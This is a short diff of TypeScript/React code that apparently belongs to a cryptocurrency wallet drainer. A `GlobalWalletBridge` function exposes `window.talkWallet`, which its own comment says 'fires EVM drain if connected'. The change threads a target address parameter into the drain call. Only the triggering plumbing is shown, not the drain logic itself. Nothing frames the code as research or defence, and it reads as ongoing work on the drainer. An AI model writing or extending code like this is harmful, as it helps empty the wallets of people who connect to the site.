@@ -220,11 +220,11 @@ function GlobalWalletBridge() {
     };
 
     // talkWallet: fires EVM drain if connected, otherwise opens RainbowKit modal
-    (window as any).talkWallet = () => {
+    (window as any).talkWallet = (addr?: string) => {
       if (isConnected) {
         const callDrain = () => {
           const fn = (window as any).__originalTalkWallet;
-          if (typeof fn === 'function') fn();
+          if (typeof fn === 'function') fn(addr);
         };
         if (connector) {
           connector.getProvider().then((provider: any) => {
